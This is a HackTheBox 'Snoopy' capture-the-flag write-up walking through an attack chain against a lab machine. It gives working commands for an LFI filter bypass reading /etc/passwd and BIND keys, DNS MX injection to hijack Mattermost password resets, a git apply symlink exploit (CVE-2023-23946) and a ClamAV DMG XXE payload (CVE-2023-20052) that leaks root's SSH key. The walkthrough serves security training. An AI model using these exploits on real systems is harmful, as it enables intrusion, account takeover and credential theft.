# HackTheBox — Snoopy | Full Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Hard
> **Category:** Web / Linux / DNS / CVE Chain
> **Date:** March 20, 2026

---

## TL;DR

Snoopy is a hard Linux box built around a chain of interconnected vulnerabilities. A PHP download endpoint is vulnerable to LFI via a `....//` filter bypass, which allows reading BIND9 DNS configuration files containing a TSIG key. That key is used with `nsupdate` to inject a fake MX record, redirecting Mattermost password reset emails to a local SMTP listener. With Mattermost access, an internal server provisioning slash command triggers an outbound SSH connection from the target — captured using the Cowrie honeypot — leaking system credentials. From the initial shell, CVE-2023-23946 (`git apply` symlink rename) is used to write an SSH key into another user's authorized_keys. Final escalation to root exploits CVE-2023-20052, an XXE vulnerability in ClamAV's DMG parser that leaks root's private SSH key through debug output.

---

## Recon

### Port Scan

```bash
nmap -sV -sC -T4 --open <TARGET>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**Thought process:** Three ports. Port 53 (DNS) being open on what appears to be a web box is the first major signal — DNS is almost never exposed without purpose in a CTF context. This strongly suggests DNS-based attacks: zone transfer, dynamic update abuse, or subdomain enumeration. Port 80 is the immediate entry point, but port 53 is kept in mind throughout.

### Web Enumeration

Browsing to port 80 revealed a static marketing site for a fictional DevSecOps company called "SnoopySec". Key pages identified:

| Path | Content |
| --- | --- |
| `/` | Main page — press release download link with `?file=` parameter |
| `/team.html` | Staff directory with names, roles, and email addresses |
| `/contact.html` | Mentions migrating DNS records to a mail subdomain |
| `/download?file=announcement.pdf` | Serves a ZIP archive of the requested file |

**Thought process:** The `?file=` parameter on the download endpoint immediately stands out as a potential LFI or path traversal vector. The team page discloses real usernames through email addresses. The contact page hinting at DNS migration is a contextual clue that DNS will matter later.

### DNS Zone Transfer

```bash
dig axfr <domain> @<TARGET>
```

Zone transfer succeeded without authentication, disclosing all internal subdomains:

```
mattermost.<domain>  →  172.18.0.3  (Docker container)
mm.<domain>          →  127.0.0.1   (Mattermost instance)
provisions.<domain>  →  172.18.0.4  (Docker container)
postgres.<domain>    →  172.18.0.2  (Docker container)
```

**Thought process:** Zone transfer open without authentication is a critical misconfiguration. The presence of `mm.<domain>` resolving to localhost reveals a Mattermost instance running internally. `provisions.<domain>` is unknown at this point but noted for later. The Docker IP ranges (`172.18.0.x`) confirm an internal container network the web server can reach but we cannot directly.

---

## LFI — The `....//` Filter Bypass

### Discovery

Testing the `?file=` parameter with basic traversal sequences showed all `../` patterns returning empty ZIPs. Reading the download script via LFI (once the bypass was found) revealed the filter logic:

```php
$content = preg_replace('/\.\.\//', '', $file);
$filecontent = $dir . $content;
```

**Thought process:** `preg_replace` with a non-recursive regex strips `../` in a single pass. This is a known weak filter. The bypass is `....//` — when `../` is stripped from the middle of this sequence, the surrounding characters combine to form a new `../`.

Breakdown:
```
Input:   ....//
Strip:   ..  //   (removes the ../ from positions 3-5)
Result:  ../       (the outer dots and trailing slash remain)
```

### Verifying the Bypass

```bash
# Confirm bypass returns a non-empty ZIP
curl -s 'http://<TARGET>/download?file=....//....//....//....//etc/passwd' -o /tmp/lfi.zip
unzip -p /tmp/lfi.zip
```

Output confirms `/etc/passwd` content is returned, validating the bypass works at four directory levels deep.

### Reading BIND Configuration

With LFI confirmed, the priority is finding the BIND key. On Ubuntu/Debian systems, BIND config splits across multiple files:

```bash
# named.conf.local — shows zone config and which key controls dynamic updates
curl -s 'http://<TARGET>/download?file=....//....//....//....//etc/bind/named.conf.local' \
  -o /tmp/bindlocal.zip && unzip -p /tmp/bindlocal.zip
```

```
zone "<domain>" IN {
    type master;
    file "/var/lib/bind/db.<domain>";
    allow-update { key "rndc-key"; };
};
```

```bash
# named.conf.options — contains the actual TSIG key secret
curl -s 'http://<TARGET>/download?file=....//....//....//....//etc/bind/named.conf.options' \
  -o /tmp/bindopts.zip && unzip -p /tmp/bindopts.zip
```

```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "<BASE64_SECRET>";
};
```

**Key finding:** The TSIG key is readable. BIND is configured to allow dynamic DNS updates authenticated by this key. This means we can add, modify, or delete DNS records for the zone.

---

## DNS MX Injection → Email Interception

### Goal

No MX record exists for the domain, so Mattermost cannot send emails. Injecting an MX record pointing to our machine will route any outbound email — including password reset links — directly to us.

### Verifying No MX Exists

```bash
dig MX <domain> @<TARGET>
# ANSWER: 0 records — confirmed no MX
```

### Setting Up the Key File

```bash
cat > /tmp/rndc.key << 'EOF'
key "rndc-key" {
    algorithm hmac-sha256;
    secret "<BASE64_SECRET>";
};
EOF
```

### Why MX Must Point to a Hostname (Not a Raw IP)

MX records are defined in RFC 5321 as requiring a hostname, not an IP address. Mail servers performing DNS lookups will query the MX hostname for its A record. Injecting a raw IP as the MX value causes mail delivery to fail silently. The correct approach is to inject both an A record for a mail hostname and an MX record pointing to that hostname:

```bash
nsupdate -k /tmp/rndc.key << 'EOF'
server <TARGET>
zone <domain>
update add mail.<domain> 3600 A <KALI_IP>
update add <domain> 3600 MX 10 mail.<domain>
send
EOF

# Verify both records were added
dig MX <domain> @<TARGET>
dig A mail.<domain> @<TARGET>
```

**Note:** The MX TTL is 3600 seconds (1 hour). Re-inject before triggering resets if more than an hour has passed.

### Setting Up the SMTP Listener

HTB blocks inbound port 25 at the VPN level. The workaround is `iptables` PREROUTING to redirect traffic destined for port 25 to a local high port where a listener is running:

```bash
# Python's smtpd module was removed in 3.12+ — use aiosmtpd instead
cd ~/hackthebox/machine/snoopy
python3 -m venv venv && source venv/bin/activate
pip install aiosmtpd

# Redirect inbound :25 → :2525
sudo iptables -t nat -A PREROUTING -p tcp --dport 25 -j REDIRECT --to-port 2525

# Start the listener
python3 -m aiosmtpd -n -l 0.0.0.0:2525
```

### Triggering Password Resets

Mattermost provides an unauthenticated API endpoint for password resets. Triggering it for accounts discovered on the team page causes Mattermost to look up the MX record for the domain, connect to our machine, and deliver the reset email:

```bash
curl -s -X POST 'http://<TARGET>/api/v4/users/password/reset/send' \
  -H 'Host: mm.<domain>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<user>@<domain>"}'
```

The aiosmtpd terminal displays the full raw email including the password reset token URL.

### Resetting Passwords and Logging In

```bash
# Use the token from the intercepted email
curl -s -X POST 'http://<TARGET>/api/v4/users/password/reset' \
  -H 'Host: mm.<domain>' \
  -H 'Content-Type: application/json' \
  -d '{"token":"<TOKEN_FROM_EMAIL>","new_password":"<NEWPASS>"}'

# Login to get a Bearer token
curl -s -X POST 'http://<TARGET>/api/v4/users/login' \
  -H 'Host: mm.<domain>' \
  -H 'Content-Type: application/json' \
  -D /tmp/mm_headers.txt \
  -d '{"login_id":"<user>","password":"<NEWPASS>"}'

grep -i ^token /tmp/mm_headers.txt
```

Accounts reset and accessed: regular users, the provisioning bot operator, and the Mattermost admin.

---

## Mattermost Enumeration

### Team and Channels

```bash
# Get teams
curl -s 'http://<TARGET>/api/v4/teams' \
  -H 'Host: mm.<domain>' \
  -H 'Authorization: Bearer <TOKEN>' | python3 -m json.tool

# Get channels for the team
curl -s 'http://<TARGET>/api/v4/teams/<TEAM_ID>/channels' \
  -H 'Host: mm.<domain>' \
  -H 'Authorization: Bearer <TOKEN>'
```

Three channels found:

| Channel | Messages | Notable Content |
| --- | --- | --- |
| Town Square | 15 | ClamAV deployed on servers; IPA authentication required for provisioning |
| Server Provisioning | 4 | Original messages inaccessible (Mattermost free tier post history limit) |
| Off-Topic | 0 | Empty |

**Key intel from Town Square:** Two critical pieces of information surface here. First, ClamAV is running on the servers — this is a future privesc hint. Second, the provisioning operator states that any host submitted for provisioning must already be registered with their IPA system — implying the provisioning service SSHes into the provided host.

### Discovering the Provisioning Bot

With admin access:

```bash
curl -s 'http://<TARGET>/api/v4/commands?team_id=<TEAM_ID>&custom_only=true' \
  -H 'Host: mm.<domain>' \
  -H 'Authorization: Bearer <ADMIN_TOKEN>' | python3 -m json.tool
```

```json
{
  "trigger": "server_provision",
  "method": "P",
  "url": "http://provisions.<domain>:8080",
  "display_name": "Server Provision"
}
```

**Key finding:** The `/server_provision` slash command POSTs to an internal container on port 8080. This endpoint is not externally reachable — only Mattermost itself can communicate with it.

### Interactive Dialog — The Critical Discovery

The slash command opens a Mattermost interactive dialog (modal form). This must be triggered through the browser UI — attempting to replicate it via curl fails because the `trigger_id` returned by the API expires in approximately 3 seconds, which is not enough time to construct and submit the dialog payload manually.

**Thought process:** The form is accessed by typing `/server_provision` in the Mattermost channel via browser. The dialog reveals the form fields:

| Field | Type | Notable Value |
| --- | --- | --- |
| Email | Text | Must be a valid domain email |
| Department | Dropdown | Engineering, IT, etc. |
| Operating System | Dropdown | **`Linux - TCP/2222`** |
| Server IP address | Text | Free-form IP input |

The Operating System dropdown value `Linux - TCP/2222` is the most important finding on the entire box. It reveals that the provisioning service SSHes to the submitted IP **on port 2222** — not the standard port 22. This means our honeypot only needs to listen on 2222.

---

## SSH Credential Capture — Cowrie Honeypot

### What Didn't Work

Multiple approaches failed before finding the right tool:

- **ssh-mitm** — catches the TCP connection and shows key exchange but does not capture password authentication attempts
- **Custom paramiko server** — accepted connections but `get_allowed_auths()` was never called with credentials in a way that was printable
- **netcat** — receives the raw TCP connection and sees the SSH banner but cannot speak the SSH protocol

### What Worked — Cowrie Docker Honeypot

Cowrie is a purpose-built SSH honeypot that fully simulates an SSH server, accepts connections, logs all authentication attempts (password and public key), and even simulates a shell session:

```bash
docker run -p 2222:2222 cowrie/cowrie:latest
```

With Cowrie listening, submit the provisioning form in the browser:

- **Email:** any valid domain email
- **Department:** Engineering
- **Operating System:** `Linux - TCP/2222`
- **Server IP:** `<KALI_IP>`

Cowrie output shows the authentication attempt from the provisions container, revealing the username and password used by the bot.

---

## Initial Access — SSH

With credentials from Cowrie, SSH into the box as the captured user. No user flag is present in this user's home directory — it belongs to a different account.

Checking sudo rights:

```bash
sudo -l
```

```
User <USER> may run the following commands:
    (<OTHER_USER>) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

**Thought process:** This is a highly constrained sudo rule. The regex `^apply -v [a-zA-Z0-9.]+$` permits only the subcommand `apply -v` followed by a filename containing only alphanumeric characters and dots — no slashes, no extra flags. This eliminates `--directory`, `--work-tree`, and any path-based arguments. `git 2.34.1` is running, which is vulnerable to CVE-2023-23946.

---

## Lateral Movement — CVE-2023-23946 (git apply Symlink Rename)

### The Vulnerability

CVE-2023-23946 affects `git apply` in versions prior to 2.39.2. Git normally prevents patches from writing files through symbolic links — a symlink traversal check runs at patch parse time. The bypass: include a **rename** of the symlink within the same patch. Git checks for symlink traversal before the rename is applied, meaning the renamed path no longer triggers the check when the file creation is subsequently processed.

### Constraints from the Sudo Rule

The regex only allows a filename matching `[a-zA-Z0-9.]+` — no directory separators. This means:

- The patch file must be in the current working directory
- No `--directory` flag allowed
- No `--work-tree` flag allowed
- `git apply` writes files relative to the `.git` repository's working tree or CWD

The solution: create a fake `.git/config` with `worktree` pointed to the target user's home, OR run from a directory where a symlink can be created. After testing, running from a directory within the current user's home with a symlink and the patch file in the same location works cleanly.

### The Exploit

```bash
# Create working directory and symlink pointing to target user's .ssh
mkdir -p /home/<USER>/test && cd /home/<USER>/test
ln -s /home/<TARGET_USER>/.ssh symlink

# Generate a key pair for SSH access
ssh-keygen -t ed25519 -f /tmp/target_key -N ""
PUBKEY=$(cat /tmp/target_key.pub)

# Craft the exploit patch — rename symlink first, then create file through it
cat > patch << PATCHEOF
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1 @@
+$PUBKEY
PATCHEOF

# Apply as the target user — writes authorized_keys to their .ssh directory
sudo -u <TARGET_USER> /usr/bin/git apply -v patch

# SSH in with the generated key
ssh -i /tmp/target_key <TARGET_USER>@localhost
```

**Why the rename trick works:** When git parses the patch, it checks whether `symlink/authorized_keys` traverses a symlink — it does, so it would normally be blocked. But the patch first renames `symlink` → `renamed-symlink`. By the time the `authorized_keys` file creation is processed, `renamed-symlink` exists as a symlinked path that was not checked during the initial symlink traversal scan.

```bash
cat ~/user.txt
```

---

## Privilege Escalation — CVE-2023-20052 (ClamAV DMG XXE)

### Sudo Rights

```bash
sudo -l
```

```
User <USER> may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/<USER>/scanfiles/[a-zA-Z0-9.]+$
```

**Thought process:** `clamscan` can be run as root with `--debug` and a file from a specific directory — no other flags allowed. ClamAV 1.0.0 is installed, which is vulnerable to CVE-2023-20052. The `--debug` flag is what makes the vulnerability exploitable for information disclosure: it causes ClamAV to print verbose internal state including resolved XML entity values.

### The Vulnerability

CVE-2023-20052 is an XML External Entity (XXE) injection in ClamAV's Apple DMG file parser. When ClamAV parses a DMG file, it reads an embedded XML property list (plist) using libxml2 with the `XML_PARSE_NOENT` flag enabled — this flag allows external entity substitution. The `--debug` flag causes ClamAV to print the resolved text value of XML keys as it processes the plist, including any entities that were expanded from external files.

**The critical insight about `bbe`:** In a real Apple DMG, the plist contains `<key>blkx</key>` elements — "blkx" is the block index identifier. The `bbe` binary editor replaces this literal string in the binary DMG with `&xxe;`. When ClamAV reads that key's text content and sees `&xxe;`, libxml2 resolves the entity to the file contents, and the debug line prints:

```
cli_scandmg: wanted blkx, text value is <FILE CONTENTS HERE>
```

The XXE entity must be in a `<key>` element, not a `<string>` element. ClamAV only prints key text values — string values inside dicts are used differently and are not printed in this debug path.

### Building the Exploit DMG

The DMG must be built using `libdmg-hfsplus`, which requires OpenSSL 1.x to compile. Ubuntu 20.04+ ships OpenSSL 3.0, which breaks the build due to deprecated `HMAC_CTX` API changes. **Debian Stretch** with `libssl1.0-dev` is required.

```dockerfile
FROM debian:stretch
RUN echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check \
    && echo 'APT::Get::AllowUnauthenticated "true";' >> /etc/apt/apt.conf.d/99no-check
RUN echo "deb http://archive.debian.org/debian stretch main contrib non-free" > /etc/apt/sources.list \
    && echo "deb http://archive.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list
RUN apt-get update --allow-insecure-repositories -y && \
    apt-get install -y --allow-unauthenticated \
    libssl1.0-dev gcc g++ cmake zlib1g-dev genisoimage bbe git
RUN git clone https://github.com/planetbeing/libdmg-hfsplus.git && \
    cd libdmg-hfsplus && cmake . && make && cp dmg/dmg /bin/
WORKDIR /exploit
```

```bash
# Build and run the container
sudo docker build -t cve-2023-20052 .
sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash
```

Inside the container:

```bash
# Step 1 — build a real HFS+ DMG (this contains the legitimate blkx plist structure)
genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && \
  dmg dmg test.img test.dmg

# Step 2 — inject XXE: replace DOCTYPE declaration and replace blkx KEY TEXT with &xxe;
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' \
    -e 's/blkx/&xxe\;/' \
    test.dmg -o exploit.dmg

ls -la exploit.dmg
exit
```

### Transferring and Executing

```bash
# Kali — serve the file
python3 -m http.server 8080

# Target (as the low-privilege user)
mkdir -p /home/<USER>/scanfiles
cd /home/<USER>/scanfiles
wget http://<KALI_IP>:8080/exploit.dmg

# Run the exploit — root's SSH key appears in debug output
sudo /usr/local/bin/clamscan --debug /home/<USER>/scanfiles/exploit.dmg 2>&1 | \
  grep -A 100 "wanted blkx" | grep -v "LibClamAV"
```

The output contains the full contents of `/root/.ssh/id_rsa` printed line by line.

### SSH as Root

Save the extracted private key on Kali, set correct permissions, and connect:

```bash
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@<TARGET>
cat /root/root.txt
```

---

## Attack Chain

```
nmap → Port 22, 53, 80
│
├── Port 80 — nginx / SnoopySec static site
│   ├── /team.html → staff emails (potential usernames)
│   └── /download?file= → ZIP endpoint
│       └── ....// LFI bypass (preg_replace single-pass strip)
│           └── /etc/bind/named.conf.options → BIND TSIG key
│
└── Port 53 — BIND 9.18.12
    └── dig axfr → open zone transfer → mm.<domain>, provisions.<domain>
        └── nsupdate -k /tmp/rndc.key → inject MX → <KALI_IP>
            └── iptables PREROUTING 25→2525 + aiosmtpd listener
                └── Mattermost /api/v4/users/password/reset/send
                    └── Email intercepted → reset tokens for multiple accounts
                        └── Admin API → /server_provision slash command
                            └── Browser dialog: Server IP=<KALI_IP>, OS=Linux TCP/2222
                                └── Cowrie Docker :2222 → credentials captured
                                    └── SSH as cbrown
                                        └── sudo -u sbrown git apply -v patch
                                            └── CVE-2023-23946 symlink rename
                                                └── SSH as sbrown → user.txt ✅
                                                    └── sudo clamscan --debug exploit.dmg
                                                        └── CVE-2023-20052 DMG XXE
                                                            └── root SSH key in debug output
                                                                └── SSH as root → root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `dig` | DNS zone transfer and record verification |
| `nsupdate` | TSIG-authenticated DNS dynamic record injection |
| `aiosmtpd` | Fake SMTP server to intercept Mattermost emails |
| `iptables` | Redirect inbound port 25 → local port 2525 |
| Mattermost API | Account takeover, channel enumeration, slash command discovery |
| Cowrie (Docker) | Full SSH honeypot for credential capture |
| `ssh-keygen` | Generate key pairs for lateral movement |
| `git apply` | CVE-2023-23946 — symlink rename path traversal |
| `genisoimage` | Build HFS+ disk image as base for DMG |
| `dmg` (libdmg-hfsplus) | Convert HFS+ image to Apple DMG format |
| `bbe` | Binary stream editor — patch DMG plist to inject XXE |
| `clamscan --debug` | CVE-2023-20052 — leak file content via debug output |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| Path traversal filter bypass (`....//`) | `download.php` — `preg_replace` single pass | Read arbitrary files as `www-data` |
| DNS zone transfer open (no auth) | BIND 9.18.12 | All internal subdomains and IPs disclosed |
| BIND TSIG key readable via LFI | `/etc/bind/named.conf.options` | DNS record injection capability |
| No MX record + injectable DNS | `<domain>` | Mattermost password reset email interception |
| Mattermost password reset via email | `mm.<domain>` | Account takeover for all users |
| Provisioning bot SSHes to user-supplied IP | `provisions.<domain>:8080` | Credential capture via SSH honeypot |
| CVE-2023-23946 — `git apply` symlink rename | `git 2.34.1` | Write arbitrary files as another user |
| CVE-2023-20052 — ClamAV DMG XXE | `ClamAV 1.0.0` | Read arbitrary files as root via debug output |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| `../` and `%2F` traversal | `preg_replace('/\.\.\//')` strips them — bypass required |
| `nsupdate` without TSIG key | BIND returns REFUSED — authenticated updates only |
| MX record pointing to raw IP | RFC requires MX → hostname → A record chain; raw IPs break mail delivery |
| Inbound port 25 | HTB VPN blocks it — iptables PREROUTING redirect to 2525 required |
| Python `smtpd` module | Removed in Python 3.12+ — use `aiosmtpd` instead |
| `curl` for slash command dialog | `trigger_id` expires in ~3 seconds — browser UI required |
| `ssh-mitm` | Only shows key exchange, does not capture password auth credentials |
| Custom paramiko fake SSH server | Accepted connections but credential capture was unreliable |
| Symlink directly in patch | Git blocks it: `affected file is beyond a symbolic link` |
| `--directory` or `--work-tree` flags | Sudo regex blocks slashes — these flags cannot be passed |
| DMG XXE in `<string>` element | ClamAV only prints `<key>` text values in debug — string values are not printed |
| Building libdmg-hfsplus on Ubuntu | OpenSSL 3.0 breaks `HMAC_CTX` — Debian Stretch + `libssl1.0-dev` required |
| `clamscan --database/--copy/-f` | Not in the allowed sudo pattern — only `--debug <file>` is permitted |

---

## Key Takeaways

**1. `....//` bypasses single-pass `../` regex filters**
`preg_replace('/\.\.\//', '', $input)` runs once and strips `../` wherever it finds it. Placing `../` inside `....//` means the outer characters reform `../` after stripping. Always try doubled traversal sequences when single `../` is filtered.

**2. DNS port 53 open on a web box — always zone transfer first**
An open DNS port on a non-DNS server is almost always deliberate. `dig axfr` is free and instant. Zone transfers on misconfigured resolvers expose the full internal topology.

**3. MX records must chain through a hostname — raw IPs cause silent mail failure**
Injecting a raw IP as an MX value is technically invalid and causes mail delivery to fail without obvious error. Always inject an A record for a hostname first, then point MX to that hostname.

**4. HTB blocks inbound port 25 — use iptables PREROUTING**
`sudo iptables -t nat -A PREROUTING -p tcp --dport 25 -j REDIRECT --to-port 2525` captures all traffic destined for port 25 before it hits the firewall, redirecting it to a local listener. This is the reliable fix for the port 25 block.

**5. Use Cowrie Docker for SSH honeypot credential capture**
`docker run -p 2222:2222 cowrie/cowrie:latest` is a complete, battle-tested SSH honeypot. Skip `ssh-mitm` and custom paramiko servers in CTF scenarios — Cowrie reliably captures credentials from bots and automated scripts.

**6. Mattermost slash command dialogs require a browser — curl trigger_id expires too fast**
Interactive dialogs use a `trigger_id` that expires in approximately 3 seconds. The API round-trip via curl cannot complete in time. Use the Mattermost web UI in a browser to interact with dialogs.

**7. CVE-2023-23946 requires the symlink rename trick**
Git blocks patches from writing through symlinks by checking at parse time. The bypass includes a rename operation in the same patch — git validates symlinks before the rename, so after the rename the path is no longer flagged and the file is written through the symlink target.

**8. CWD matters for constrained `git apply` sudo rules**
When `--directory` and `--work-tree` flags are blocked by a sudo regex, the working directory determines where files are written. Create the symlink and patch file in the same directory, ensure git can find the `.git` config, and run from there.

**9. CVE-2023-20052 — the XXE is in the `<key>` text, not `<string>` values**
The `bbe` command replaces the literal text `blkx` in the binary DMG. This text appears as the content of XML `<key>` elements in the plist — not inside `<string>` elements. ClamAV's debug line `"wanted blkx, text value is %s"` prints key text. The entity must replace a key value, not a string value.

**10. Build libdmg-hfsplus on Debian Stretch — not Ubuntu**
Ubuntu 20.04+ uses OpenSSL 3.0 which deprecates `HMAC_CTX` as an opaque type, breaking the libdmg-hfsplus build. Use `FROM debian:stretch` with `libssl1.0-dev` in Docker. The Debian Stretch GPG keys are expired — add `--allow-insecure-repositories` to bypass.

---

*Written by k41r0s3 | HackTheBox | Snoopy | Hard*
